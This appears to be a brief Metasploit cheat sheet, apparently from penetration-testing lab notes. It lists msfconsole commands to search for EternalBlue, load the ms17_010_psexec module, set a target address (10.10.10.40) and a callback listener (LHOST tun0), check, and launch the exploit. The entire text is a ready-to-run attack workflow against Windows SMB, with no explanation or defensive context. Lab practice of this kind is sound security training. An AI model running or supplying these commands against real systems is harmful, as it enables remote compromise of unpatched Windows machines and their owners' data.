search exploit eternalblue
search cve:2009
# How use example
use exploit/windows/smb/ms17_010_psexec
show options
set RHOSTS 10.10.10.40
set LHOST tun0
# Check setups
check
# Execute exploit
exploit (or) run